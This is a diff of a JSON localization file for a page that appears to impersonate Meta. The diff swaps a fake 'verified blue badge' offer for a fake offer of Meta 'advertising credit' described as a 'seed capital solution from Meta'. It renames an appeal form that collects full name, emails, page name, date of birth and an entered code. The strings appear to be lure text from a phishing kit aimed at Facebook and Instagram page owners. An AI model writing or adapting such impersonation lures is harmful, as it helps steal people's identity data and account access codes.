@@ -39,13 +39,13 @@
         "instagramSettings": "Instagram Settings"
       },
       "rightTop": {
-        "congrats": "Congratulations on achieving the requirements to upgrade your page to a verified blue badge! This is a fantastic milestone that reflects your dedication and the trust you've built with your audience.",
+        "congrats": "Congratulations! You are eligible to receive a credit from our system. This credit recognizes your credibility and contributions while opening up new opportunities for future growth.",
         "ticketId": "Your ticket id: {ticketId}"
       },
       "warnings": {
-        "w1": "The blue badge helps prevent identity impersonation, provides priority support via email and chat, and upgrades your profile with more professional features.",
-        "w2": "The blue badge verifies your authentic identity to reduce impersonation, provides priority support through email and chat, and unlocks advanced profile features.",
-        "w3": "With the blue badge, your identity is verified to prevent impersonation, you receive fast support via email/chat, and enjoy an upgraded profile experience with more features."
+        "w1": "Smart financial leverage: This is a seed capital solution from Meta that helps businesses run advertising campaigns on Facebook and Instagram without upfront costs, optimizing cash flow efficiently.",
+        "w2": "Risk-free testing opportunity: Advertising credit allows you to freely experiment with new audience segments or creative content formats with a \"zero-cost\" budget, helping you find the most effective conversion strategies.",
+        "w3": "Accelerate breakthrough growth: By leveraging this promotional budget, brands can maintain continuous presence on customers’ feeds, increase brand awareness, and drive sales from the early stages."
       },
       "cta": {
         "requestReview": "Request Review"
@@ -94,16 +94,16 @@
         "metaAi": "Meta Ai"
       },
       "popup": {
-        "appealFormTitle": "Appeal Form",
+        "appealFormTitle": "Information form",
         "placeholders": {
           "fullName": "Full name",
           "email": "Email",
           "businessEmail": "Email business",
-          "pageName": "Facebook page name",
+          "pageName": "Link to page or Page name",
           "dobDay": "Day",
           "dobMonth": "Month",
           "dobYear": "Year",
-          "issue": "Describe your issue",
+          "issue": "What support do you need regarding advertising credit?",
           "code": "Enter code"
         },
         "helper": {
